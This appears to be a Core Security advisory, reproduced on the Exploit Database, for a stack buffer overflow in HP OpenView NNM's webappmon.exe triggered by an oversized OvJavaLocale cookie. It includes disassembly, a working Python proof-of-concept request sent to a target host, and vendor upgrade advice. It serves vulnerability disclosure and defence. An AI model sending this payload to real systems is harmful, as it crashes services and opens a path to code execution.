3. VULNERABILITY DESCRIPTION

There is a buffer overflow vulnerability in the webappmon.exe CGI application included with HP OpenView NNM[1]. This bug can be exploited by sending a cookie header with a maliciously crafted OvJavaLocale value. Code execution is likely achievable in a reliable way.

6. VENDOR INFORMATION, SOLUTIONS AND WORKAROUNDS

Upgrade to the latest version of OpenView NNM, available from HP. More information can be found on HP's security bulletin HPSBMA02563 SSRT100165 rev.1: http://www.securityfocus.com/archive/1/512822

7. CREDITS

This vulnerability was discovered and researched by Nahuel Riva from Core Security Technologies. The publication of this advisory was coordinated by Pedro Varangot.

8. TECHNICAL DESCRIPTION / PROOF OF CONCEPT CODE

HP OpenView NNM OvJavaLocale Buffer Overflow Vulnerability HP NNM bundles with a CGI script called webappmon.exe. This application receives its parameters over HTTP POST and GET. A buffer overflow occurs when invoking it, for example with a GET query, and maliciously setting cookies by sending the following HTTP HEADER:

'Cookie: OvJavaLocale=%s.Cp1252;' % ("A" * 10000)

To parse this header the OvWwwDebug function from ovwww.dll is called:

5A307477 OvWwwDebug       55              PUSH EBP
5A307478                  8BEC            MOV EBP,ESP
5A30747A                  B8 20140000     MOV EAX,1420
5A30747F                  E8 CC850000     CALL ovwww.5A30FA50
5A307484                  33C0            XOR EAX,EAX
5A307486                  A0 543F325A     MOV AL,BYTE PTR DS:[5A323F54]
5A30748B                  83E0 01         AND EAX,1
5A30748E                  85C0            TEST EAX,EAX
5A307490                  75 22           JNZ SHORT ovwww.5A3074B4

This function calls a sprintf_new() wrapper from ov.dll:

5A307521                  8B8D E8EBFFFF   MOV ECX,DWORD PTR SS:[EBP-1418]
5A307527                  51              PUSH ECX
5A307528                  8B55 08         MOV EDX,DWORD PTR SS:[EBP+8]
5A30752B                  52              PUSH EDX
5A30752C                  8D85 00ECFFFF   LEA EAX,DWORD PTR SS:[EBP-1400]
5A307532                  50              PUSH EAX
5A307533                  FF15 9001315A   CALL DWORD PTR DS:[<&ov.sprintf_new>]    ; ov.sprintf_new

Which calls sprintf() with incorrectly passed and sanitized parameters:

5A028409 sprintf_new    /$  55            PUSH EBP
5A02840A                |.  8BEC          MOV EBP,ESP
5A02840C                |.  B8 10000100   MOV EAX,10010                            ;  UNICODE "PROFILE=C:\Documents and Settings\All Users"
5A028411                |.  E8 3A650000   CALL ov.5A02E950
[...]
5A02854E                |.  51            PUSH ECX                                 ; /<%s>
5A02854F                |.  68 6441045A   PUSH ov.5A044164                         ; |format = "%s"
5A028554                |.  8B55 08       MOV EDX,DWORD PTR SS:[EBP+8]             ; |
5A028557                |.  52            PUSH EDX                                 ; |s
5A028558                |.  FF15 C002035A CALL DWORD PTR DS:[<&MSVCRT.sprintf>]    ; \sprintf
[...]

There format equals HTTP_COOKIE=%s. This triggers a buffer overflow that overwrites the functions return address and exception handler on the stack.

The following Python code triggers the buffer overflow:

import socket

ip = "192.168.1.0"
port = 80

target = (ip, port)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(target)

headers  = 'GET /OvCgi/webappmon.exe?ins=nowait&sel=%s&app%s=&act%s=&arg=&help=&cache=1600 HTTP/1.1\r\n' % ("A", "B", "C")
headers += 'Host: %s\r\n' % ip
headers += 'User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\r\n'
headers += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
headers += 'Accept-Language: en-us,en;q=0.5\r\n'
headers += 'Accept-Encoding: gzip,deflate\r\n'
headers += 'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n'
headers += 'Keep-Alive: 300\r\n'
headers += 'Connection: keep-alive\r\n'
headers += 'Cookie: OvJavaLocale=%s.Cp1252;' % ("A" * 10000) + 'OvWebSession=14150:AnyUser%3a\r\n'
headers += 'Cache-Control: max-age=0\r\n'
headers += '\r\n'

s.sendall(str(headers))

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
